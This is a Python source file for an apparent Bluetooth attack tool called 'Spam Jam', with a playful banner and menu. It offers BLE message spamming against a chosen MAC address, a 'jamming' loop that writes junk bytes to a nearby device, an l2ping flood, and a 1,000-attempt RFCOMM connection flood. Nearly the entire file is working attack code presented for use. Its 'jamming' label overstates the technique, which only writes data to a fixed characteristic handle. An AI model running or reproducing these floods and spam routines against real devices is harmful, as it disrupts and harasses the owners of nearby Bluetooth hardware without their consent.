import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException

# 🎨 Spam Jam & Party Pooper Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 A WORLD OF BLE FUN 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with MORE Custom Attacks! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 🚀 BLE Spamming
def spam_ble():
    target_mac = input("💜 Enter target BLE MAC address: ")
    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()

    try:
        print("🔎 Attempting connection with RANDOM address type...")
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
    except BTLEException:
        print("⚠️ RANDOM address type failed! Trying PUBLIC address type...")
        try:
            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
        except BTLEException as e:
            print(f"❌ Failed to connect to {target_mac}. Error: {e}")
            return

    peripheral.setDelegate(BLESpam())
    while True:
        try:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            break

# 🎯 BLE Jamming (FULLY FIXED!)
def jam_ble():
    print("🔎 Resetting BLE scan before jamming...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    while True:
        print("🔎 Scanning for BLE devices to jam 📡")
        scanner = Scanner()

        try:
            devices = scanner.scan(10.0)
        except BTLEException as e:
            print(f"⚠️ BLE Scan Failed! Error: {e}")
            continue

        if not devices:
            print("⚠️ No BLE devices found. Try again!")
            continue

        for idx, device in enumerate(devices):
            print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

        try:
            device_idx = int(input("💜 Enter the index of the device to jam: "))
            target_device = devices[device_idx].addr
        except (ValueError, IndexError):
            print("⚠️ Invalid index.")
            continue

        print(f"💥 Jamming device {target_device} 🚀💜")
        try:
            peripheral = Peripheral(target_device)
            while True:
                junk_data = b'\x00\xFF' * 50
                peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
                print(f"🚀 Jammed {target_device} with noise 💜💥")
                time.sleep(0.1)
        except BTLEException as e:
            print(f"⚠️ Failed to jam {target_device}: {e}")
            retry = input("💜 Try another device? (y/n): ").strip().lower()
            if retry != 'y':
                break

# 🔎 Bluetooth Scanner
def scan_bluetooth():
    print("🔎 Resetting BLE scan before scanning for devices...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("🔎 Scanning for Bluetooth devices... (This may take a few seconds)\n")

    try:
        scanner = Scanner()
        devices = scanner.scan(10.0)

        if not devices:
            print("⚠️ No Bluetooth devices found. Try again!")
        else:
            print("📡 Found Bluetooth Devices:")
            for idx, device in enumerate(devices):
                print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    except BTLEException as e:
        print(f"⚠️ Error running Bluetooth scan: {e}")

    print("\n✅ Scan complete!\n")

# 💥 CUSTOM L2PING FLOOD ATTACK (Now with Retry Option!)
def l2ping_attack():
    while True:
        addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")

        if os.geteuid() != 0:
            print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
            return

        print(f"💥 Sending L2Ping flood to {addr}")
        try:
            subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
            print("✅ L2Ping attack successful!")
            break
        except subprocess.CalledProcessError:
            print(f"⚠️ Failed to send L2Ping to {addr}. The device may be offline or rejecting pings.")
            retry = input("💜 Try a different device? (y/n): ").strip().lower()
            if retry != 'y':
                break

# ✅ RFCOMM FLOOD FUNCTION!
def rfcomm_flood():
    addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")

    if not addr:
        print("⚠️ No address entered. Exiting RFCOMM flood.")
        return

    print(f"💥 Starting RFCOMM connection flood on {addr}...")

    for i in range(1000):
        try:
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
            print(f"✅ Attempt {i+1}: Connected to {addr}")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {i+1}: Connection failed to {addr}")

# 🦠 Start Bluetooth Service
def start_bluetooth():
    print("📡 Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("✅ Bluetooth service started!")

# 🏁 Main Function
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣ Spam a BLE device 💌")
        print("🔹 2️⃣ Jam a BLE device 🚫")
        print("🔹 3️⃣ Scan for Bluetooth devices 📡")
        print("🔹 4️⃣ L2Ping Attack 💥")
        print("🔹 5️⃣ RFCOMM Flood 💥")
        print("🔹 6️⃣ Start Bluetooth Service 📡")
        print("🔹 7️⃣ Quit 🚪")

        choice = input("💜 Choose an option (1-7): ")
        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth]

        if choice == "7":
            print("👋 Goodbye, fren! XOXOXO 💜")
            sys.exit()
        elif choice in "123456":
            functions[int(choice)-1]()
        else:
            print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
